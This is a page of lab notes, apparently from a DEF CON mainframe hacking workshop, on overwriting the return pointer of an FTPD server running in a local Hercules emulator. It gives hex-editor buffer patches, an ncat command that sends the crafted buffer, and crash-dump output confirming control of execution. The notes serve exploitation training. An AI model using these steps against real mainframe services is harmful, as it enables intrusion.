@@ -1,0 +1,39 @@
+created: 20220804150341318
+modified: 20220804223400500
+tags: 
+title: Lab 13 - Not So Fast There
+type: text/vnd.tiddlywiki
+
+!! Change the return pointer
+
+# First we need a location in memory to jump to, so open dump.txt  `kate ~/dump.txt`
+#* Go to the beginning of the most resent dump and search for `Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Ae0Af1Af`
+
+```
+134080   C185F2C1 85F3C185 F4C185F5 C185F6C1    85F7C185 F8C185F9 C185F0C1 86F1C186   *Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Ae0Af1Af*
+```
+reading this line: The line starts at memory location `134080`. We need this location in ASCII first, so:
+
+* 13 --> 13
+* 40 --> 20
+* 80 --> D8
+
+# Open pattern4 in you hex editor: `okteta pattern4`
+# Search for `8Ac9` and replace it with `801320D8`
+# Save this as pattern5
+
+!! Restarting the FTPD server
+
+# On the Command line in http://localhost:8888 (Username/password: `defcon`) type `/start ftpddc30,srvport=2125`
+# Submit your edited second buffer: `cat pattern5|ncat -v -w1 localhost 2125`
+# Notice in the hercules console at http://localhost:8888/ the message `/ IEF450I FTPDDC30 FTPDDC30 - ABEND S0C1 U0000` means we've crashed FTPD
+# Congrats you crashed it, again! 
+# On the Command line in http://localhost:8888 (Username/password: `defcon`) type `/start ftpddc30,srvport=2126` 
+
+!! We control Return
+
+# Take a look at the crash dump, if you look at the PSW you'll see `PSW AT ENTRY TO ABEND  078D0000 00134086`
+#* `00134086` is the address where it crashed (6 bytes in from where we told it to jump, this means the jump worked)
+#* `SYSTEM = 0C1` means that an attempt has been made to execute an invalid op code. http://faculty.cs.niu.edu/~hutchins/csci640/abend.htm
+
+Now we just copy/paste our machine code from maybe `DEFCON.OVERFLOW(WTO400)` and we're good. Well NOT SO FAST!
